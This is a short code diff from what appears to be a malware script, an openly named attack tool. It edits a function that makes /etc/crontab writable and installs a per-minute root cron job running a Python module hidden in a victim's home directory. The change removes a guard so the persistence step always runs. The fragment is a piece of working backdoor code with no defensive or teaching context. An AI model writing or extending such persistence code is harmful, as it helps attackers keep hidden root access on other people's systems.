@@ -9,8 +9,6 @@ varAttackCommand = '* * * * * root sudo /usr/bin/python /home/victim/.var/.modul
 
 
 def set_up_crontab():
-    if not is_set_up_crontab():
-        return
 
     # Write Crontab
     os.system('sudo chmod +w /etc/crontab')
